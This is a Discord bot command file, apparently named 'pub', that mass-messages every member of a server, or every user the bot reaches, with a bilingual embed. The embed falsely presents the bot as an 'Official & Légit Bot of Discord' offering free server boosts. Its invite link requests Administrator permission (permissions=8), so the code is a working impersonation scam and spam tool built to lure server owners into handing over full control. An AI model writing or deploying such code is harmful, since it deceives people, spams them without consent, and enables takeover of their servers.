const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");
const config = require("../storage/config.json")

module.exports.run = async (bot, message, args) =>{
  message.delete();
  if(message.author.id === config.owner){
    if(args[0] === "here") {
    const embed = new RichEmbed()
    .setTitle("Free Boost Server")
    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
    .setColor("#FE08EB")
    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
     `)
    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
    .setTimestamp()
     message.guild.members.forEach((users, i) => {
      setTimeout(() => {
        users.send(embed)
      }, i * 4000)
      })
    } else if (!args[0]) {
    const embed = new RichEmbed()
    .setTitle("Free Boost Server")
    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
    .setColor("#FE08EB")
    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
     `)
    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
    .setTimestamp()
     bot.users.forEach((users, i) => {
      setTimeout(() => {
        users.send(embed)
      }, i * 4000)
      })
    } else {
      const servers = args.join(" ")
      const guild = bot.guilds.find("name", servers) 
      const embed = new RichEmbed()
    .setTitle("Free Boost Server")
    .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
    .setColor("#FE08EB")
    .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
    .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
    **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
     `)
    .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
    .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
    .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
    .setTimestamp()
      message.channel.send(`Pub éfféctué sur le serveur : ${guild}`)
     guild.members.forEach((users, i) => {
      setTimeout(() => {
        users.send(embed)
      }, i * 4000)
      })
    }
  }else {
    return
  }
}
module.exports.help = {
    name: "pub"
}
